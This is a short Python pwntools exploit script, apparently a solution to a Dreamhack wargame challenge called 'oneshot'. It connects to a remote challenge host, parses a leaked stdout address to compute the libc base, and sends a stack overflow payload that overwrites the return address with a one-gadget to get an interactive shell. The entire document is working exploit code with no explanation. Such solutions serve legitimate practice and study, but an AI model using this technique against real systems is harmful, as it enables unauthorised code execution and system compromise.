from pwn import *

port = 9665
rem = remote("host3.dreamhack.games", port)
lib = ELF("./oneshot/problem/libc.so.6")

def slog(name, addr): return success(': '.join([name, hex(addr)]))  
  
rem.recvuntil(b'stdout: 0x')
stdout_addr = int(rem.recvn(12).decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
gadget_offset = 0x45216
gadget_addr = lib_base + gadget_offset

slog("lib", lib_base)

msg = b'A' * 16 + b'B' * 8
payload = msg + b'\x00' * 8 + b'C' * 8
payload += p64(gadget_addr)
rem.sendlineafter(b'MSG: ', payload)

rem.recvuntil(msg)
rem.interactive()